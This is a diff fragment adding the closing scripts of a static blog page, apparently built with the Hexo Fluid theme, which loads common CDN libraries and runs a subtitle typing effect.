+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
